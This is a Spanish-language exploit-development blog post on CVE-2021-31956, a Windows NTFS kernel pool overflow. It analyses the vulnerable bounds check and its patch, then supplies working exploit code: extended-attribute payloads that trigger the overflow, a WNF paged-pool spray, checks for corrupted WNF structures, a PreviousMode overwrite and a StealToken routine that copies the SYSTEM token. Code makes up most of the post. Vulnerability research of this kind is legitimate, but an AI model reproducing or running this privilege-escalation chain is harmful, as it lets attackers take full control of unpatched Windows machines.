---
layout: post
title: Exploit Development y Analisis de CVE-2021-31956 NTFS Windows Kernel Pool Overflow
---

## Analisis
La vulnerabilidad se encuentra en el componente ntfs.sys dentro de la funcion **NtfsQueryEaUserEaList**, podemos ver el codigo vulnerable y el parche.

Funcion Vulnerable:

``` c
__int64 __fastcall NtfsQueryEaUserEaList(__int64 a1, __int64 eas_blocks_for_file, __int64 a3, __int64 out_buf, unsigned int out_buf_length, unsigned int *a6, char a7)
{

  unsigned int padding; // er15
  padding = 0;


   for ( i = a6; ; i = (unsigned int *)((char *)i + *i) )
    {
      if ( i == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(
                                ea_blocks_for_file,
                                *(unsigned int *)(a3 + 4),
                                &DestinationString,
                                &ea_block_pos) )
        {
          ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9;           // un atacante lo puede manipular
          if ( ea_block_size <= out_buf_length - padding )                                //  esta verficacion es donde se produce el desbordamiento
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }

           *((_BYTE *)out_buf_pos + *((unsigned __int8 *)v11 + 4) + 8) = 0;
LABEL_8:
            v18 = ea_block_size + padding + v15;
            occupied_length = v18;
            if ( !a7 )
            {
              if ( v23 )
                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;
              if ( *v11 )
              {
                v23 = out_buf_pos;
                out_buf_length -= ea_block_size + padding;
                padding = ((ea_block_size + 3) & 0xFFFFFFFC) - ea_block_size;
                goto LABEL_24;
              }


```

El parche:

``` c
 v12 = *v11;
    v13 = *((unsigned __int8 *)v11 + 4);
    v22 = *v11 + v8;
    for ( i = a6; ; i = (unsigned int *)((char *)i + *i) )
    {
      if ( i == v11 )
      {
        v15 = occupied_length;
        out_buf_pos = (_DWORD *)(out_buf + padding + occupied_length);
        if ( (unsigned __int8)NtfsLocateEaByName(
                                ea_blocks_for_file,
                                *(unsigned int *)(a3 + 4),
                                &DestinationString,
                                &ea_block_pos) )
        {
          ea_block = (ea_block *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9; 
          if ( ea_block_size + padding <= out_buf_length )// vemos que aca tenemos la correccion
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }
        else
        {
```



Volvamos a la funcion vulnerable:



``` c
  ea_block = (FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);
          ea_block_size = ea_block->EaNameLength + ea_block->EaValueLength + 9;           // un atacante lo puede manipular
          if ( ea_block_size <= out_buf_length - padding )                                //  esta verficacion es donde se produce el desbordamiento
          {
            memmove(out_buf_pos, ea_block, ea_block_size);
            *out_buf_pos = 0;
            goto LABEL_8;
          }
        }

           *((_BYTE *)out_buf_pos + *((unsigned __int8 *)v11 + 4) + 8) = 0;
LABEL_8:
            v18 = ea_block_size + padding + v15;
            occupied_length = v18;
            if ( !a7 )
            {
              if ( v23 )
                *v23 = (_DWORD)out_buf_pos - (_DWORD)v23;
              if ( *v11 )
              {
                v23 = out_buf_pos;
                out_buf_length -= ea_block_size + padding;
                padding = ((ea_block_size + 3) & 0xFFFFFFFC) - ea_block_size;
                goto LABEL_24;
              }
```

Vemos que recorre cada atributo EA y lo copia en el bloque de el pool que se asigno anteriormente, el cual tenemos control de su tamaño tambien  y el tamaño de cada copia es **ea_block->EaValueLenght + ea_blocal->EaNameLength + 9.**

La estructura **ea_block** es la siguiente:

```c
typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset; 
  UCHAR  Flags;
  UCHAR  EaNameLength; 
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
```


Vemos que hay una verficacion  antes de cada copia que es:

``` c
ea_block_size <= out_buf_length - padding

```
**out_buf_length** se pasa como parametro y disminuye cada loop.


La variable **padding** esta calculado por la siguiente operacion **((ea_block_size + 3) 0xFFFFFFFC) - ea_block_size** , por lo que tenemos control sobre ella.

Luego **out_buf_pos** es el bloque de memoria asignado en el pool donde se va a copiar la inforamcion que se asigna en la funcion **NtfsCommonQueryEa** y va a desbordarse.

Tambien tenemos control sobre **EaNameLength** y **EaValueLength**.


Pongamos un ejemplo de desborde:

supongamos que pasamos los siguiente valores para el primer loop:


```c
EaNameLength = 5
EaValueLength = 4

ea_block_size = 9 + 5 + 4 // 18
padding = 0

por lo que la verficacion sera:
18 <= 18 - 0 .

out_buf_length = 18 - 18 + 0 
out_buf_length = 0.

padding = ((18+3)   0xFFFFFFFC) - 18
padding = 2

```

Luego nuestro segundo atributo extendido:

```c
EaNameLength = 5
EaValueLength = 47

ea_block_size = 5 + 47 + 9
ea_block_size = 137

ea_block_size <= out_buf_length - padding
la verificacion da  137 <= 0 - 2

```

Va a superar la verficacion y se va copiar 137 bytes al final de buffer por lo que va a desbordar el bloque de memoria contiguo.


## Activando Vulnerabilidad

Primero para que ocurra todo esto se asigna el bloque de memoria en el pool paginado que va a desbordarse en la funcion **NtfsCommonQueryEa** y nosotros tenemos control de el tamaño de este bloque, entonces para triggerear esta vulnerabilidad nesesitamos llamar desde userspace a la funcion NtQueryEaFile que nos va a llevar al codigo vulnerable pero primero nesesitamos llamar a la funcion **NtSetEaFile** para  construir un archivo de atributos extendidos NTFS y luego pasarselo como argumento a la funcion **NtQueryEaFile**.

El codigo va  a quedar asi:

```c
curEa = (PFILE_FULL_EA_INFORMATION)payLoad;

curEa->Flags = 0;
curEa->EaNameLength = 3;
curEa->EaValueLength = 162;
		
curEa->NextEntryOffset = (curEa->EaNameLength + curEa->EaValueLength + 3 + 9) & (~3);
memcpy(curEa->EaName, ".PA", 3);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 162, 0x41);

curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa->NextEntryOffset);
curEa->NextEntryOffset = 0;
curEa->Flags = 0;
 
curEa->EaNameLength = 4;
curEa->EaValueLength = 0xF;
memcpy(curEa->EaName, ".PBB", 4);
RtlFillMemory(curEa->EaName + curEa->EaNameLength + 1, 0xf, 0);

pd = (PUCHAR)(curEa);


NTSTATUS Status = NtSetEaFile(hFile, &eaStatus, payLoad, sizeof(payLoad));


```


## Configuracion de la memoria y Objetos Windows Notification Facility

Ahora usaremos los objetos WNF  **Windows Notification Facility**, vamos a  sprayear el paged pool  y  sobreescribir su estructura  con el desbordamiento para lograr la escalada de privilegios.

Vamos a nesesitar sprayear el pool con dos estructuras que son **_WNF_NAME_INSTANCE** y **_WNF_STATE_DATA**.

```c

nt!_WNF_STATE_DATA
   +0x000 Header           : _WNF_NODE_HEADER
   +0x004 AllocatedSize    : Uint4B
   +0x008 DataSize         : Uint4B
   +0x00c ChangeStamp      : Uint4B
```

```c
nt!_WNF_NAME_INSTANCE
   +0x000 Header           : _WNF_NODE_HEADER
   +0x008 RunRef           : _EX_RUNDOWN_REF
   +0x010 TreeLinks        : _RTL_BALANCED_NODE
   +0x028 StateName        : _WNF_STATE_NAME_STRUCT
   +0x030 ScopeInstance    : Ptr64 _WNF_SCOPE_INSTANCE
   +0x038 StateNameInfo    : _WNF_STATE_NAME_REGISTRATION
   +0x050 StateDataLock    : _WNF_LOCK
   +0x058 StateData        : Ptr64 _WNF_STATE_DATA
   +0x060 CurrentChangeStamp : Uint4B
   +0x068 PermanentDataStore : Ptr64 Void
   +0x070 StateSubscriptionListLock : _WNF_LOCK
   +0x078 StateSubscriptionListHead : _LIST_ENTRY
   +0x088 TemporaryNameListEntry : _LIST_ENTRY
   +0x098 CreatorProcess   : Ptr64 _EPROCESS
   +0x0a0 DataSubscribersCount : Int4B
   +0x0a4 CurrentDeliveryCount : Int4B

```

Estas estructuras son allocadas en el pool paginado por medio de las funciones **NtCreateWnfStateName** and **NtUpdateWnfStateData**, nesesitamos asignar estas dos estrcuturas y que nuestra memoria quede confirgurada de la siguiente manera:

![Configuracion de memoria](/images/NTFS%20CHUNK.png)


Primero empezamos con la primera estructura que queremos que desborde que es **_WNF_STATE_DATA**, asignamos varias estructuras en el pool y liberamos otras con la funcion **NtDeleteWnfStateData**,luego como primera prueba para ver si  nuestra estructura **_WNF_STATE_DATA** fue corrompida cuando activamos la vulnerabilidad tenemos que ver el  **ChangeStamp** es **0xcafe**  que ese valor fue puesto por nosotros para identificarlo.

![Configuracion de memoria](https://decoded.avast.io/wp-content/uploads/sites/2/2022/01/wnf_state_data.png)

Despues de que tengamos una corrupcion exitosa de **_WNF_STATE_DATA** necesitamos asignar la otra estructura que es **_WNF_NAME_INSTANCE** que quede adyacente a la estructura **WNF_STATE_DATA** como vimos en la imagen mas arriba.

Antes expliquemos el porque corromper la estructura **_WNF_STATE_DATA** primero, es porque  el campo **_WNF_STATE_DATA.AllocatedSize** determina cuantos bytes se pueden escribir  y **_WNF_STATE_DATA.DataSize** determina cuantos bytes podemos leer  y al corromper estos campos con un valor alto nos proporciona una primitiva de lectura y escritura para escribir mas que el tamaño del buffe, con la funcion **NtQueryWnfStateData** podemos leer datos y con **NtUpdateWnfStateData** Podemos escribir datos.

Ahora para detectar que a una estructura **WNF_STATE_DATA** le sigue la estructura **_WNF_NAME_INSTANCE** debemos realizar una sobrelectura con la primitiva de lectura que nos dio **WNF_STATE_DATA**  y verificar los bytes  **03 09 A8** que indican el incio de la estructura  **WNF_NAME_INSTANCE**.

El codigo en el exploit nos queda de la siguiente manera, asi sprayeamos el pool:



``` c


int HeapSpray() {

	NTSTATUS state = 0; 
	PSECURITY_DESCRIPTOR pSD = nullptr; 
	BYTE upData[0xa0] = { 0 }; 
	RtlFillMemory(upData, sizeof(upData), 'C'); 

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor((LPCWSTR)"", SDDL_REVISION_1, &pSD, nullptr)) { 
		return -1; 
	}
	for (int i = 0; i < 10000; i++) { 
		state = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, 0x1000, pSD); 
		
	
		if (state != 0)
		{
			if (pSD)
			{
				LocalFree(pSD);
				pSD = nullptr;
			}

			printf("Could not create WNF state name at index (%lld) with error (%lx).", i, state);
			return false;
		}
	
	}
	for (int i = 1; i < 10000; i += 2) { 

		state = NtDeleteWnfStateName(&StateNames[i]); 
		if (state != 0) { 
			return -1; 

	}
		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;
		state = NtUpdateWnfStateData((PWNF_STATE_NAME)&StateNames[i - 1], &upData, 0xa0, NULL, NULL, NULL, 0); 
		
		if (state != 0) { 
			return -1; 
		}
	}

	for (int i = 0; i < 10000; i += 4) {

		NtDeleteWnfStateData(&StateNames[i], NULL);
		NtDeleteWnfStateName(&StateNames[i]);

		StateNames[i].Data[0] = 0;
		StateNames[i].Data[1] = 0;

	}


}

```

Luego asi comprobamos que la memoria tenga las dos estructuras contiguas:

``` c

	state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
			if (state == 0xc0000023) {

				
				ULONG Size = 0x1000;
				NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &Size);
				
				PWNF_NAME_INSTANCE WnfIns = (PWNF_NAME_INSTANCE)(Buff + 0xa0 + 0x10);

				if (WnfIns->Header.NodeByteSize == 0xa8 && WnfIns->Header.NodeTypeCode == 0x903 && WnfIns->RunRef.Ptr == NULL) {
					printf("Struct WNF_STATE_NAME corrupted Found\n");
					if (!FlipPreviuosMode(&StateNames[i], Buff)) {
						printf("error FLipPreviousMode");
					}


```

```c

 if (WnfIns->Header.NodeByteSize == 0xa8 && WnfIns->Header.NodeTypeCode == 0x903 && WnfIns->RunRef.Ptr == NULL) 

```
En esta parte prueba que estemos ante un encabezado **_WNF_NAME_INSTANCE**.

Pero antes de eso comprueba de que tengamos una estructura **WNF_STATE_DATA** corrompida

``` c
state = NtQueryWnfStateData(&StateNames[i], NULL, NULL, &Stamp, &Buff, &BufferSize);
			if (state == 0xc0000023) 

```

Aca lo que sucede que la funcion  **NtQueryWnfStateData** lee datos y los almacena en  **Buff** y si el **BufferSIze** es menor que **StateData→DataSize** entonces nos devolvera un **C0000023** que quiere decir que estamos antes un **WNF_STATE_DATA** corrompido.


## PreviousMode y Robo de tokens
luego lo destacado que tiene la estructura  **WNF_NAME_INSTANCE** es el campo **WNF_NAME_INSTANCE.CreatorProcess** que nos da el **EPROCESS** del proceso actual.

Otra cosa relevante que tiene  **WNF_NAME_INSTANCE** es el campo **_WNF_NAME_INSTANCE.StateData** Que es un puntero a **_WNF_STATE_DATA** y si reemplazamos ese puntero por una direccion arbitraria podemos leer y escribir en dicha direccion.

Esto nos podria perimitir usar la tecnica de Previus Mode para escalar privilegios, veamos como se hace:

El puntero **StateData** se establece primero en **_EPROCESS+0x28**, lo que permite leer el campo **_KPROCESS.ThreadListHead**, **ThreadListHead** apunta a **_KTHREAD.ThreadListEntry** del primer hilo, que es el hilo actua ,al restar el desplazamiento de **ThreadListEntry**, se obtiene la direccion **_KTHREAD** base del hilo actual.

Con la dirección base de **_KTHREAD**, **StateData** apunta a **_KTHREAD+0x220**, lo que le permite leer/escribir hasta tres bytes a partir de **_KTHREAD+0x230**, utiliza esto para establecer el byte **_KTHREAD+0x232** en cero. el desplazamiento 0x232 corresponde a **_KTHREAD.PreviousMode**, ponemos  **PreviousMode** en cero y con lo que engañamos al kernel que algunas llamadas al sistema se originan en el kernel y nos permite usar las funciones **NtReadVirtualMemory** y **NtWriteVirtualMemory** para poder hacer el robo de tokens y escalar privilegios.


```c

bool StealToken(UINT_PTR Eprocess, UINT_PTR* OldToken) {

	char Buffer[0x1000] = { 0 };
	UINT_PTR StartEprocess = Eprocess;
	
	UINT_PTR token = 0;

	printf("[*]Starting token steal...\n");
	
	bool res=NtReadWrapper((UINT_PTR)(Eprocess + Token), OldToken, sizeof(*OldToken));
	if (!res) {
		printf("Error copy Backup Token\n");
		return false;
	}
	do {
		bool result = NtReadWrapper(StartEprocess, Buffer, sizeof(Buffer));

		if (!result) {
			printf("Error read Eprocess\n");
			return false;
		}

		UINT_PTR UniqueProcId = 0;
		result = NtReadWrapper((UINT_PTR)(StartEprocess + UniqueProcessId), &UniqueProcId, sizeof(UniqueProcId));

		if (!result) {

			printf("Error Read UniqueProcessId\n");
			return false;
		}

		if (UniqueProcId == 4) {
			
			 result = NtReadWrapper((UINT_PTR)(StartEprocess + Token), &token, sizeof(token));
			if (!result) {
				printf("Error copy token\n");
				return false;
			}
			break;

		}
		
		StartEprocess = (UINT_PTR)(((_LIST_ENTRY*)(Buffer + ActiveProcessLinks))->Flink) - ActiveProcessLinks;

	} while (StartEprocess != Eprocess);
	
	res = NtWriteWrapper((UINT_PTR)(Eprocess + Token), &token, sizeof(token));
	if (!res) {
		printf("Error copy System Process token\n");
		return false;
	}

	printf("[*]Token copied successfully\n");
	


	return true;
}

```

## Demostracion

![Configuracion de memoria](/images/photo_5136685581147942004_y.jpg)
